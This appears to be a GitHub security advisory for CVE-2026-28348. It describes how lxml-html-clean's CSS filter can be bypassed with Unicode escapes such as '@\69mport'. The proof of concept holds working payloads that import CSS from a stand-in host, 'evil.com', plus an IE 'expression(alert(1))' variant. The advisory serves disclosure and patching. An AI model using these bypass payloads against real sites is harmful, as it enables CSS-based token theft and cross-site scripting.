# [M] lxml-html-clean has CSS @import Filter Bypass via Unicode Escapes

## Summary
Severity: Medium
Advisory: GHSA-hw26-mmpg-fqfg
CVE: CVE-2026-28348
CWE: CWE-116
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-03-02
Source: https://github.com/advisories/GHSA-hw26-mmpg-fqfg
Type: github-advisory

## Affected
- PyPI: `lxml-html-clean` — affected >=0 <0.4.4

## Details
### Summary
The `_has_sneaky_javascript()` method strips backslashes before checking for dangerous CSS keywords. This causes CSS Unicode escape sequences to bypass the `@import` and `expression()` filters, allowing external CSS loading or XSS in older browsers.

### Details
The root cause is located in `clean.py` (around line 594):
```python
style = style.replace('\\', '')
```
This transformation changes a payload like `@\69mport` into `@69mport`. This resulting string does NOT match the blacklist keyword `@import`. However, all modern browsers' CSS parsers decode `\69` as the character 'i' (hex 69) according to CSS spec section 4.3.7, interpreting `@\69mport` as a valid `@import` statement.

Same root cause bypasses `expression()` detection: `\65xpression(alert(1))` passes through (IE only).

### PoC
```python
from lxml_html_clean import clean_html

# Normal @import is correctly blocked:
# clean_html('<style>@import url("http://evil.com/x.css");</style>')
# Output: <div><style> url("http://evil.com/x.css");</style></div>

# Unicode escape bypass:
result = clean_html('<style>@\\69mport url("http://evil.com/x.css");</style>')
print(result)
# Output: <div><style>@\69mport url("http://evil.com/x.css");</style></div>
```
If rendered in a browser, the browser loads the external CSS. Variants like `@\0069mport`, `@\69 mport` (trailing space), and `@\49mport` (uppercase I) also work.

### Impact
External CSS loading enables data exfiltration via attribute selectors (e.g., reading CSRF tokens), UI redressing, and phishing. In older browsers (IE), this allows for full XSS via `expression()`.

## References
- https://github.com/fedora-python/lxml_html_clean/security/advisories/GHSA-hw26-mmpg-fqfg
- https://nvd.nist.gov/vuln/detail/CVE-2026-28348
- https://github.com/fedora-python/lxml_html_clean/commit/2ef732667ddbc74ea59847bcf24b75809aaeed3b
- https://github.com/fedora-python/lxml_html_clean
